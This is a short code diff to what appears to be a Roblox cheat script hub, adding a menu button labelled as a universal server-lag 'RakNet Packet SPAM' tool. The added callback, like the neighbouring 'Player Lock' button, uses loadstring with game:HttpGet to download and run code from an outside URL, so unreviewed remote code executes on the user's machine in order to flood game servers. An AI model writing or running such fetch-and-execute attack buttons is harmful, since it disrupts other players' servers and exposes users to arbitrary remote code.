@@ -1900,6 +1900,13 @@ Tab9:AddButton({
 })
 
 Tab9:AddButton({
+    Name = "Lag Server Universal Best RakNet Packet SPAM",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/sobachgroi67-cpu/idkgscripts/refs/heads/main/gscripts"))()
+    end    
+})
+
+Tab9:AddButton({
     Name = "Player Lock Universal",
     Callback = function()
         loadstring(game:HttpGet("https://protected-roblox-scripts.onrender.com/4b0ef829d88e76e4904fceb02f0fe030"))()
